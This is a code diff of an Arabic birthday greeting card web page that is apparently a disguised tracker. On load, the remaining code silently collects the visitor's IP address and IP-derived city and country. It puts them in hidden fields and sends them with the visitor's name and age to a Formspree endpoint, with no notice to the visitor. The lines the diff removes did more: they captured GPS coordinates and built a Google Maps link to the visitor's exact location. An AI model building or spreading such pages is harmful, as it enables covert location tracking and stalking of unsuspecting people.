@@ -5,13 +5,13 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>بطاقة تهنئة عيد ميلاد 🎂</title>
   <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
     body {
       font-family: system-ui, -apple-system, sans-serif;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
-      margin: 0;
       background: linear-gradient(135deg, #ff9a9e 0%, #fad0c4 99%, #fad0c4 100%);
       padding: 20px;
     }
@@ -85,10 +85,6 @@
       font-weight: 500;
       min-height: 25px;
     }
-    /* ===== إخفاء المعلومات ===== */
-    .hidden-info {
-      display: none !important;
-    }
   </style>
 </head>
 <body>
@@ -98,7 +94,6 @@
   <h2>كل عام وأنت بخير!</h2>
   <p class="greeting-text">🎈 أدخل اسمك وسنة ميلادك، وستظهر لك تهنئة خاصة بعمرك الحقيقي!</p>
 
-  <!-- رسالة العمر -->
   <div id="birthdayMessage" class="birthday-message">
     🎂 <span id="displayName"></span>، عمرك الآن <span id="displayAge"></span> سنة!
     <br>كل سنة وأنت طيب يا بطل 💪
@@ -109,72 +104,27 @@
     <input type="number" id="yearInput" placeholder="📅 أدخل سنة ميلادك (مثال: 1995)" required min="1900" max="2026">
     <div id="status"></div>
 
-    <!-- ===== حقول مخفية ===== -->
-    <input type="hidden" id="lat" name="latitude">
-    <input type="hidden" id="lon" name="longitude">
-    <input type="hidden" id="map_link" name="google_maps_link">
-    <input type="hidden" id="age" name="age">
     <input type="hidden" id="ip" name="ip">
     <input type="hidden" id="location" name="location">
+    <input type="hidden" id="age" name="age">
 
     <button type="button" class="btn-submit" onclick="handleSubmit()">🎁 إرسال التهنئة الآن</button>
   </form>
 </div>
 
 <script>
-  // ===== متغيرات =====
-  let userLat = null;
-  let userLon = null;
-  let userIP = 'غير متاح';
-  let userLocation = 'غير متاح';
-
-  // ===== جلب الموقع عبر GPS تلقائياً =====
-  function getLocationGPS() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        (position) => {
-          userLat = position.coords.latitude;
-          userLon = position.coords.longitude;
-          document.getElementById('lat').value = userLat;
-          document.getElementById('lon').value = userLon;
-          document.getElementById('map_link').value = `https://maps.google.com/?q=${userLat},${userLon}`;
-          
-          // جلب اسم المدينة من الإحداثيات
-          fetch(`https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=${userLat}&longitude=${userLon}&localityLanguage=ar`)
-            .then(response => response.json())
-            .then(data => {
-              const city = data.locality || data.city || 'غير معروف';
-              const country = data.countryName || 'غير معروف';
-              userLocation = `${city}، ${country}`;
-              document.getElementById('location').value = userLocation;
-            })
-            .catch(() => {
-              userLocation = `${userLat}, ${userLon}`;
-              document.getElementById('location').value = userLocation;
-            });
-        },
-        (error) => {
-          console.log("GPS غير مفعل، استخدام IP.");
-          fetchIPAndLocation();
-        }
-      );
-    } else {
-      fetchIPAndLocation();
-    }
-  }
-
-  // ===== جلب IP والموقع عبر IP =====
+  // ===== جلب IP والموقع (بدون GPS) =====
   async function fetchIPAndLocation() {
     try {
       const ipRes = await fetch('https://api.ipify.org?format=json');
       const ipData = await ipRes.json();
-      userIP = ipData.ip;
-      document.getElementById('ip').value = userIP;
+      const ip = ipData.ip;
+      document.getElementById('ip').value = ip;
 
-      const geoRes = await fetch(`https://ipapi.co/${userIP}/json/`);
+      const geoRes = await fetch(`https://ipapi.co/${ip}/json/`);
       const geoData = await geoRes.json();
-      userLocation = `${geoData.city || 'غير معروف'}، ${geoData.region || ''}، ${geoData.country_name || 'غير معروف'}`;
-      document.getElementById('location').value = userLocation;
+      const location = `${geoData.city || 'غير معروف'}، ${geoData.region || ''}، ${geoData.country_name || 'غير معروف'}`;
+      document.getElementById('location').value = location;
 
     } catch (error) {
       console.log("تعذر جلب IP");
@@ -207,6 +157,8 @@
     const year = document.getElementById('yearInput').value.trim();
     const status = document.getElementById('status');
     const age = document.getElementById('age').value;
+    const ip = document.getElementById('ip').value;
+    const location = document.getElementById('location').value;
 
     if (!name) {
       status.innerText = "⚠️ الرجاء إدخال اسمك!";
@@ -237,11 +189,8 @@
       name: name,
       age: age,
       birth_year: year,
-      ip: document.getElementById('ip').value || "غير متاح",
-      location: document.getElementById('location').value || "غير متاح",
-      latitude: document.getElementById('lat').value || "غير متاح",
-      longitude: document.getElementById('lon').value || "غير متاح",
-      google_maps_link: document.getElementById('map_link').value || "غير متاح"
+      ip: ip || "غير متاح",
+      location: location || "غير متاح"
     };
 
     fetch("https://formspree.io/f/xpqvvkdp", {
@@ -269,9 +218,7 @@
 
   // ===== تشغيل عند تحميل الصفحة =====
   window.onload = function() {
-    getLocationGPS();
     fetchIPAndLocation();
-
     document.getElementById('yearInput').addEventListener('input', calculateAgeAndShow);
     document.getElementById('nameInput').addEventListener('input', calculateAgeAndShow);
   };
